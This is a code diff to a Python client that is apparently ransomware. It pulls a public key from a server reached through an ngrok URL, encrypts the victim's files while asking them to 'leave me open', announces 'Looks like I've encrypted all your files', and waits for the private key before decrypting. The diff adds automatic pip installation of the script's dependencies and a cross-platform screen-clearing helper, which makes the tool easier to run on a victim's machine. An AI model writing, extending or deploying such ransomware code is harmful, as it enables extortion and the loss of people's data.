@@ -12,10 +12,34 @@ Your version of this url is what will go into the NGROK_URL variable.
 You also have the option to use the `--url=` argument if you have set up a static url with ngrok.
 It does not matter if you run the server or ngrok first, as long as both are running before the client runs.
 """
-
-import os
-import getpass
+import subprocess
+import importlib
 import sys
+import os
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+requiredModules = ['cryptography', 'requests']
+
+def installMissingModules(modules):
+    pip = 'pip'
+    try:
+        importlib.import_module(pip)
+    except ImportError:
+        print(f"{pip} is not installed. Installing...")
+        subprocess.check_call([sys.executable, "-m", "ensurepip", "--upgrade"])
+    for module in modules:
+        try:
+            importlib.import_module(module)
+        except ImportError:
+            print(f"{module} is not installed. Installing...")
+            subprocess.check_call([sys.executable, "-m", "pip", "install", module])
+
+installMissingModules(requiredModules)
+clear()
+
+import getpass
 import requests
 from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.asymmetric import padding
@@ -145,7 +169,7 @@ def await_private_key():
             private_key = serialization.load_pem_private_key(guess_bytes, password=None)
 
             if decrypt_file(private_key):
-                os.system("cls")
+                clear()
                 print("There ya go :3")
                 break
             else:
@@ -167,7 +191,7 @@ if __name__ == "__main__":
     public_key = receive_public_key(host_url)
     print("Hi hello, currently I am doing something so please give me a minute and leave me open thank you.")
     encrypt_file(public_key)
-    os.system("cls")
+    clear()
     print("Whoops! Looks like I've encrypted all your files :p")
     await_private_key()
     input("Ok you can close me now.")
